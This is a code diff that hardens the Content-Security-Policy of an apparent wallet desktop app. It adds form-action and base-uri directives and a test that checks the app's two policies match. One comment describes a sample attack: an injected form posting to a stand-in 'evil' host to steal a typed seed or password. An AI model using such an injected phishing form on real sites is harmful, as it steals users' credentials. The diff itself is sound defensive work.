@@ -13,7 +13,9 @@ use std::collections::HashMap;
 /// CSP attached to every HTML response the ros:// handler serves. `'self'` resolves to the
 /// `ros://local` document origin, so the bundle's own assets load while the untrusted bundle
 /// is sandboxed on the high-value vectors: no remote/inline/eval scripts, no plugins, no
-/// `<base>` tampering, no framing. `connect-src` allows the same https/wss surface as the
+/// `<base>` tampering, no framing, and no form submission off-origin (`form-action` is NOT
+/// covered by `default-src` — without it an injected `<form action=https://evil>` styled
+/// like the unlock dialog exfiltrates a typed seed/password on Enter, no script needed). `connect-src` allows the same https/wss surface as the
 /// classic renderer (ROS mostly routes network through the audited IPC bridge, but some
 /// features fetch directly); tightening this to IPC-only is a follow-up once ROS's direct
 /// network needs are confirmed.
@@ -26,7 +28,8 @@ font-src 'self' data:; \
 connect-src 'self' ipc: http://ipc.localhost https: wss:; \
 media-src 'self' data: blob:; \
 object-src 'none'; \
-base-uri 'self'; \
+base-uri 'none'; \
+form-action 'self'; \
 frame-ancestors 'none'";
 
 /// An in-memory, verified ROS UI bundle. Built once at launch, then read-only.
@@ -241,6 +244,33 @@ mod tests {
         }
         let zst = zstd::stream::encode_all(&tar_buf[..], 3).unwrap();
         assert!(RosBundle::from_archive(&zst).is_err());
+    }
+
+    #[test]
+    fn csp_blocks_form_exfil_base_tampering_plugins_and_framing() {
+        // Security audit round 2 (surface 9). Both native policies — the ros:// handler's
+        // header (untrusted OTA bundle) and tauri.conf.json's csp (classic renderer) —
+        // must carry the four directives default-src does NOT cover. Parity between the
+        // two is asserted so a fix to one cannot silently leave the other open.
+        let conf: serde_json::Value = serde_json::from_str(include_str!("../../tauri.conf.json"))
+            .expect("tauri.conf.json parses");
+        let classic = conf["app"]["security"]["csp"].as_str().expect("app.security.csp is a string");
+        for (name, csp) in [("ROS_CSP", ROS_CSP), ("tauri.conf.json csp", classic)] {
+            let directives: std::collections::HashMap<&str, &str> = csp
+                .split(';')
+                .filter_map(|d| {
+                    let d = d.trim();
+                    let (k, v) = d.split_once(' ').unwrap_or((d, ""));
+                    if k.is_empty() { None } else { Some((k, v.trim())) }
+                })
+                .collect();
+            assert_eq!(directives.get("form-action"), Some(&"'self'"), "{name}: form-action");
+            assert_eq!(directives.get("base-uri"), Some(&"'none'"), "{name}: base-uri");
+            assert_eq!(directives.get("object-src"), Some(&"'none'"), "{name}: object-src");
+            assert_eq!(directives.get("frame-ancestors"), Some(&"'none'"), "{name}: frame-ancestors");
+            let script = directives.get("script-src").copied().unwrap_or("");
+            assert!(!script.contains("'unsafe-inline'") && !script.contains("'unsafe-eval'"), "{name}: script-src");
+        }
     }
 
     #[test]
